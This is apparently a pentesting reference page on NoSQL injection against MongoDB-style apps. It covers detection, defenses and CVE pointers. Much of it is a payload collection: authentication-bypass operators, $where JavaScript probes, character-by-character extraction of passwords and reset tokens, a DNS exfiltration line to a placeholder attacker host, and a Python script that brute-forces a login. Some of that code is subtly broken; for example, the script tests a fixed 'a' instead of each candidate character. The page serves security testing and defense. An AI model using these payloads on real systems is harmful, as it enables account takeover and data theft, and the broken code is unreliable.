# NoSQL Injection

> Operator/JSON injection into NoSQL queries (e.g. MongoDB) bypasses logic or auth. **Deep dive:** [`Troubleshooting_Guide/nosql.md`](../../../../Troubleshooting_Guide/nosql.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** NoSQLi · A03:2021 Injection
**Status:** complete

## What it is
NoSQL injection occurs when attacker-controlled input alters the structure of a query sent to a
NoSQL datastore (MongoDB, CouchDB, etc.) rather than being treated purely as data. Because many
NoSQL drivers accept rich objects and query operators, an attacker can smuggle operators or JS
expressions to bypass authentication, logic, or read data they should not see.

## How it works
The application builds a query from user input — often by passing a request body or query string
straight into a filter object. When that input is parsed as JSON or array/bracket notation, the
attacker can replace a scalar value with a query operator (`$ne`, `$gt`, `$regex`, `$where`,
`$or`), changing the comparison the database performs. In MongoDB, a value landing in a `$where`
clause is evaluated as server-side JavaScript, escalating injection to arbitrary expression
execution. The root cause is the same as SQL injection: untrusted input mixed into query
structure without type enforcement.

## Impact
Authentication bypass (log in as any/no user), logic bypass on filters and access checks, and
extraction of arbitrary documents and fields through boolean/regex oracles. `$where` and
map-reduce contexts allow server-side JS execution, which can lead to denial of service (heavy
loops) or, in some deployments, further compromise. Severity is typically high to critical when
it yields auth bypass or bulk data exfiltration.

## How to detect
- Submitting a query operator (e.g. `username[$ne]=x` or `{"username":{"$ne":""}}`) changes the
  response in a way a literal string would not — a login succeeds, or a list returns everything.
- Boolean probes that are logically always-true vs always-false produce different responses,
  confirming the input influences query evaluation.
- Type-confusion errors or stack traces mentioning the driver/BSON when an array or object is sent
  where a string was expected.
- `$where`/regex payloads cause measurable response-time differences (time-based oracle).

## Exploitation (summary)
Identify whether input is parsed as JSON or bracket/array notation, then inject an operator to
flip a comparison — `{"$ne":""}` to match any password, or `$regex` to match a prefix. For data
theft, use a boolean or regex oracle to confirm one character at a time, walking `Object.keys`
to enumerate hidden fields such as reset tokens. Where input reaches a `$where` clause, supply a
JavaScript expression. Full payloads, blind-extraction patterns, and automation live in the
Payloads section below and the deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Detection (boolean probes)
String-context operator injection where a truthy/falsy clause changes the response. Compare an always-true against an always-false to confirm.

```text
'||1||'
'||'1'=='1
' && 1 && '
" || 1==1 || "
' || 'a'=='a
" || true || "
```

### Authentication bypass (JSON operators)
When credentials are parsed as JSON, inject operators so the comparison matches any/no value.

```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$ne":"admin"},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"wrongpass"}}
{"username":{"$regex":"^admin$"},"password":{"$ne":""}}
{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}
```

### Operator injection via query/array syntax
When the body or query string maps bracket notation onto an object, smuggle operators (`$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$or`, `$in`).

```http
username[$ne]=admin
username[$regex]=^a
password[$regex]=^.{8}$
login[$where]="1==1"
find[$regex]=^.*
filter[$in]=["admin","user"]
```

Equivalent operators usable inside a JSON filter:

```json
{"$where":"function(){return this.username=='admin'}()"}
{"$regex":".*"}
{"$exists":true}
{"$mod":[1,0]}
```

### MongoDB `$where` JavaScript execution
String context that lands inside a `$where` clause permits arbitrary JS evaluation.

```javascript
' || this.password[0]=='a || '
' || Object.keys(this)[3]=='x || '
'; return true; //
'; return this.username=='admin'; //
1; return ''=='a
```

### Blind extraction (character-by-character)
Confirm one character at a time using the response as an oracle. Iterate `N` over positions and `X` over the charset.

```javascript
administrator' && this.password[0]=='a || 'a'=='b
administrator' && this.password[1]=='d || 'a'=='b
// pattern: administrator' && this.password[N]=='X || 'a'=='b
```

Regex / `$where` variants of the same oracle:

```javascript
' && this.password.match(/^a.*/).[0]=='a || 'x'=='x
administrator' && this.password.match('^a.*').length>0 || 'x'=='y
' || this.password.match('^a.*').length>0 || 'x'=='y
' || this.password[0]=='a || 'x'=='y
```

### Hidden field / token enumeration
Walk `Object.keys(this)` to discover undocumented fields, then read their values one character at a time.

```javascript
// discover field names by index
' || Object.keys(this)[0].match('^.{0}u.*').join('') || '
' || Object.keys(this)[1].match('^.{0}p.*').join('') || '
// generic: ' || Object.keys(this)[N].match('^.{P}c.*') || '

// read a known field's value
' || this.resetToken.match('^.{0}e.*') || '
' || this.resetToken.match('^.{1}e.*') || '
// pattern: ' || this.FIELD.match('^.{N}CHAR.*') || '
```

Common high-value field names to probe: `resetToken`, `pwResetTkn`, `unlockToken`, `inviteToken`, `secretKey`, `apiKey`, `accessToken`.

### Data exfiltration
Regex range tests confirm value shape; time delay and DNS provide out-of-band oracles when no visible response differs.

```javascript
// shape / range checks
' && this.creditcard.match('^4.*').length>0 || 'x'=='y
' || this.email.match('.*@.*').length>0 || '

// time-based blind oracle
' || (function(){var x='a';for(i=0;i<100000;i++){x=x+'b'};return x.length>0})() || '

// DNS out-of-band
' || nslookup $(whoami).attacker.com || '
```

### Automation (parallel extraction)
Reference exploit driving blind password and hidden-field extraction with a worker pool.

```python
import requests, string, concurrent.futures

TARGET = "https://target.com/login"
CHARSET = string.ascii_lowercase + string.digits
WORKERS = 15

def extract_password():
    session = requests.Session()
    session.get(TARGET)
    password = ""
    for pos in range(50):
        for char in CHARSET:
            payload = f"administrator' && this.password[{pos}]=='a' || 'x'=='y"
            r = session.post(TARGET, data={"username":"admin","password":payload})
            if "Invalid" not in r.text:
                password += char
                break
    return password

def extract_field(position):
    field_value = ""
    for pos in range(100):
        for char in string.ascii_lowercase + string.digits:
            payload = f"' || Object.keys(this)[{position}].match('^.{{{pos}}}{char}.*') || 'x'=='y"
            r = requests.post(TARGET, data={"username":payload,"password":"x"})
            if "Invalid" not in r.text:
                field_value += char
                break
    return field_value
```

### Targeting reference

| Goal | Where to look / pattern |
|------|-------------------------|
| Character at position N | `^.{N}CHAR.*` |
| Starts with prefix | `^PREFIX.*` |
| Matches exact length | `^.{LENGTH}$` |
| Likely injectable endpoints | `/login`, `/forgot-password`, `/api/users`, `/api/search`, `/api/filter`, `/query` |

## Defenses
1. **Enforce input types** at the boundary — coerce credentials and IDs to strings/expected types
   and reject objects/arrays before they reach a query (the primary fix; defeats operator
   injection).
2. **Validate with a schema** (e.g. JSON Schema, Mongoose with `strictQuery`) so unexpected keys
   like `$ne`/`$where` are dropped.
3. **Never build queries by string concatenation**, and **disable server-side JS** (`$where`,
   map-reduce) where possible (`--noscripting` / `javascriptEnabled: false`).
4. Apply least-privilege DB accounts and generic error messages so oracles leak less.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=NoSQL+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=NoSQL+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=NoSQL+Injection
- **GitHub Advisories** — https://github.com/advisories?query=NoSQL+Injection
- **OSV** — https://osv.dev/list?q=NoSQL+Injection
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `NoSQL Injection <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-22911` — Rocket.Chat NoSQL injection in the `getPasswordPolicy` method, leading to
  blind data extraction and account takeover.
- `CVE-2019-10758` — mongo-express remote code execution via crafted input reaching server-side
  evaluation.
- _Canonical example: the long-documented MongoDB login bypass using `{"$ne": null}` /
  `{"$gt": ""}` against apps that pass request bodies directly into queries._

## References
- PortSwigger Web Security Academy — NoSQL injection.
- OWASP — Testing for NoSQL Injection (WSTG) & NoSQL primer in the Injection Prevention Cheat Sheet.
- MongoDB Manual — Query operators and `$where` evaluation (security notes).
